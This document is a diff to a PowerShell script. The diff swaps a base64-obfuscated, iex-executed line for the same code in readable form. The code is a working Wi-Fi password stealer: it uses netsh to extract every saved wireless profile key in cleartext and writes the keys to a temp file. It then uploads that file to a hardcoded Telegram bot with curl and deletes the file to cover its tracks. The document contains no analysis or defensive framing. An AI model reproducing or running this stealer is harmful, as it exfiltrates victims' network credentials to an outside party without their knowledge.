@@ -1,1 +1,22 @@
-$c = "JHRva2VuID0gIjgwNTU0Mzk4Nzc6QUFIcFB5eVk3OXB1dEx5eENEYTNiRUQ3S0h0RFdvMVQ4MCI7JGlkID0gIjg1OTc4MDUxNDQiOyRwID0gIiRlbnY6VEVNUFx3LnR4dCI7aWYoVGVzdC1QYXRoICRwKXtybSAkcCAtRm9yY2V9O25ldHNoIHdsYW4gc2hvdyBwcm9maWxlc3xTZWxlY3QtU3RyaW5nICJcOiguKykkiHwlIHskbj0kXy5NYXRjaGVzLkdyb3Vwc1sxXS5WYWx1ZS5UcmltKCk7JGNvbmY9bmV0c2ggd2xhbiBzaG93IHByb2ZpbGUgbmFtZT0iJG4iIGtleT1jbGVhcjskbWF0Y2g9JGNvbmZ8U2VsZWN0LVN0cmluZyAiS2V5\+IitkcGFzcztBYyAtUGF0aCAkcCAtVmFsdWUgJGxpbmV9fTtpZihUZXN0LVBhdGggJHApe2N1cmwuZXhlIC1GICJkb2N1bWVudEBkcCIgImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QkdG9rZW4vc2VuZERvY3VtZW50P2NoYXRfaWQ9JGlkIjsgcm0gJHAgLWZ9OyhOZXctT2JqZWN0IC1Db21PYmplY3QgU0FQSS5TcFZvaWNlKS5TcGVhazoiRG9uZSI="; iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($c)))
+$token = "8055439877:AAHqPyyYm79putLyxCDa3bED7KHTdWo1T80"
+$id = "8597805144"
+$p = "$env:TEMP\w.txt"
+
+if (Test-Path $p) { rm $p -Force }
+
+netsh wlan show profiles | Select-String ":(.+)$" | % {
+    $n = $_.Matches.Groups[1].Value.Trim()
+    $c = netsh wlan show profile name="$n" key=clear
+    $m = $c | Select-String "Key Content\W+:(.+)$"
+    if ($m) {
+        $pass = $m.Matches.Groups[1].Value.Trim()
+        "$n : $pass" | Out-File $p -Append -Encoding utf8
+    }
+}
+
+if (Test-Path $p) {
+    curl.exe -F "document=@$p" "https://api.telegram.org/bot$token/sendDocument?chat_id=$id"
+    rm $p -Force
+}
+
+(New-Object -ComObject SAPI.SpVoice).Speak("Done")
